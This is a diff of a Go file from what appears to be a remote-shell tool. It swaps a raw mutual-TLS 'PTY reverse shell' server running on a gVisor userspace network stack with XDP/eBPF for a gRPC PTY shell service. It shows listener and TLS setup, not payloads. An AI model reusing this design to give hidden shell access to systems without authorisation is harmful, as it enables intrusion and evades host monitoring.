@@ -1,5 +1,5 @@
-// gVisor Netstack initialization and TCP/TLS server setup
-// Initialisation du Netstack gVisor et configuration du serveur TCP/TLS
+// gVisor Netstack initialization and gRPC mTLS server setup
+// Initialisation du Netstack gVisor et configuration du serveur gRPC mTLS
 package core
 
 import (
@@ -9,7 +9,13 @@ import (
 	"fmt"
 	"log"
 	"net"
-	"runtime"
+	"net/http"
+
+	cfg "github.com/cezamee/Yoda/internal/config"
+	"github.com/cezamee/Yoda/internal/core/pb"
+
+	"golang.org/x/net/http2"
+	"google.golang.org/grpc"
 
 	"github.com/cilium/ebpf"
 	"gvisor.dev/gvisor/pkg/tcpip"
@@ -20,7 +26,6 @@ import (
 	"gvisor.dev/gvisor/pkg/tcpip/stack"
 	"gvisor.dev/gvisor/pkg/tcpip/transport/tcp"
 	"gvisor.dev/gvisor/pkg/tcpip/transport/udp"
-	"gvisor.dev/gvisor/pkg/waiter"
 	"gvisor.dev/gvisor/pkg/xdp"
 )
 
@@ -58,11 +63,11 @@ func CreateNetstack() (*stack.Stack, *channel.Endpoint) {
 
 	// Create virtual NIC endpoint (channel)
 	// Crée un endpoint NIC virtuel (channel)
-	linkEP := channel.New(64, netMTU, "")
+	linkEP := channel.New(64, cfg.NetMTU, "")
 
 	// Register NIC with the stack
 	// Enregistre le NIC dans la stack
-	if err := s.CreateNIC(netNicID, linkEP); err != nil {
+	if err := s.CreateNIC(cfg.NetNicID, linkEP); err != nil {
 		log.Fatalf("Failed to create NIC: %v", err)
 	}
 
@@ -71,14 +76,14 @@ func CreateNetstack() (*stack.Stack, *channel.Endpoint) {
 	protocolAddr := tcpip.ProtocolAddress{
 		Protocol: ipv4.ProtocolNumber,
 		AddressWithPrefix: tcpip.AddressWithPrefix{
-			Address:   tcpip.AddrFromSlice(net.ParseIP(netLocalIP).To4()),
+			Address:   tcpip.AddrFromSlice(net.ParseIP(cfg.NetLocalIP).To4()),
 			PrefixLen: 24,
 		},
 	}
 
 	// Add address to NIC
 	// Ajoute l'adresse au NIC
-	if err := s.AddProtocolAddress(netNicID, protocolAddr, stack.AddressProperties{}); err != nil {
+	if err := s.AddProtocolAddress(cfg.NetNicID, protocolAddr, stack.AddressProperties{}); err != nil {
 		log.Fatalf("Failed to add address: %v", err)
 	}
 
@@ -87,8 +92,8 @@ func CreateNetstack() (*stack.Stack, *channel.Endpoint) {
 	s.SetRouteTable([]tcpip.Route{
 		{
 			Destination: header.IPv4EmptySubnet,
-			Gateway:     tcpip.AddrFromSlice(net.ParseIP(netGateway).To4()),
-			NIC:         netNicID,
+			Gateway:     tcpip.AddrFromSlice(net.ParseIP(cfg.NetGateway).To4()),
+			NIC:         cfg.NetNicID,
 		},
 	})
 
@@ -97,8 +102,31 @@ func CreateNetstack() (*stack.Stack, *channel.Endpoint) {
 	return s, linkEP
 }
 
-func (b *NetstackBridge) SetupTCPServer() {
-	fmt.Printf("🔧 Setting up mTLS PTY Reverse Shell server...\n")
+type loggingTLSListener struct {
+	net.Listener
+}
+
+func (l *loggingTLSListener) Accept() (net.Conn, error) {
+	conn, err := l.Listener.Accept()
+	if err == nil {
+		remoteAddr := conn.RemoteAddr()
+		fmt.Printf("[gRPC] Incoming connection from %s\n", remoteAddr)
+		conn = &loggingConn{Conn: conn}
+	}
+	return conn, err
+}
+
+type loggingConn struct {
+	net.Conn
+}
+
+func (c *loggingConn) Close() error {
+	remoteAddr := c.RemoteAddr()
+	fmt.Printf("[gRPC] Connection closed from %s\n", remoteAddr)
+	return c.Conn.Close()
+}
+
+func (b *NetstackBridge) SetupGRPCServer() {
 
 	cert, err := tls.X509KeyPair(serverCertPEM, serverKeyPEM)
 	if err != nil {
@@ -122,57 +150,37 @@ func (b *NetstackBridge) SetupTCPServer() {
 		ClientCAs:                caPool,
 	}
 
-	fwd := tcp.NewForwarder(b.Stack, 0, 256, func(r *tcp.ForwarderRequest) {
-		if r.ID().LocalPort != tcpListenPort {
-			r.Complete(true)
-			return
-		}
+	ln, err := gonet.ListenTCP(b.Stack, tcpip.FullAddress{
+		NIC:  cfg.NetNicID,
+		Addr: tcpip.AddrFromSlice(net.ParseIP(cfg.NetLocalIP).To4()),
+		Port: cfg.TcpListenPort,
+	}, ipv4.ProtocolNumber)
+	if err != nil {
+		log.Fatalf("failed to create gonet listener: %v", err)
+	}
 
-		// Create session key from remote endpoint for logging only
-		sessionKey := fmt.Sprintf("%s:%d", r.ID().RemoteAddress, r.ID().RemotePort)
-		fmt.Printf("🎯 New TLS PTY reverse shell connection from %s!\n", sessionKey)
+	tlsListener := &loggingTLSListener{tls.NewListener(ln, tlsConfig)}
 
-		var wq waiter.Queue
-		ep, err := r.CreateEndpoint(&wq)
-		if err != nil {
-			fmt.Printf("❌ Failed to create endpoint: %v\n", err)
-			r.Complete(true)
-			return
-		}
+	grpcServer := grpc.NewServer()
 
-		r.Complete(false)
+	// Register gRPC services
+	pb.RegisterPTYShellServer(grpcServer, &PTYShellServerImpl{Bridge: b})
 
-		go func() {
-			defer func() {
-				ep.Close()
-				fmt.Printf("📡 Session %s cleaned up\n", sessionKey)
-			}()
+	http2Server := &http2.Server{}
+	httpServer := &http.Server{
+		TLSConfig: tlsConfig,
+		Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			grpcServer.ServeHTTP(w, r)
+		}),
+	}
 
-			// CPU Affinity Optimization: Pin TLS session to PTY I/O core
-			if runtime.NumCPU() >= 4 {
-				if err := SetCPUAffinity(CpuPTYIO); err != nil {
-					fmt.Printf("⚠️ CPU affinity for PTY I/O failed: %v\n", err)
-				}
-			}
+	if err := http2.ConfigureServer(httpServer, http2Server); err != nil {
+		log.Fatalf("Failed to configure HTTP/2: %v", err)
+	}
 
-			gonetConn := gonet.NewTCPConn(&wq, ep)
+	fmt.Printf("✅ [gRPC] ready on %s:%d (mTLS)\n", cfg.NetLocalIP, cfg.TcpListenPort)
+	if err := httpServer.Serve(tlsListener); err != nil {
+		log.Fatalf("HTTP/2 gRPC server error: %v", err)
+	}
 
-			tlsConn := tls.Server(gonetConn, tlsConfig)
-
-			fmt.Printf("🔐 Starting TLS handshake for %s...\n", sessionKey)
-			err := tlsConn.Handshake()
-			if err != nil {
-				fmt.Printf("❌ TLS handshake failed for %s: %v\n", sessionKey, err)
-				gonetConn.Close()
-				return
-			}
-
-			fmt.Printf("✅ TLS connection established for %s\n", sessionKey)
-
-			b.handleTLSPTYSession(tlsConn, sessionKey)
-		}()
-	})
-
-	b.Stack.SetTransportProtocolHandler(tcp.ProtocolNumber, fwd.HandlePacket)
-	fmt.Printf("✅ TLS PTY reverse shell server ready\n")
 }
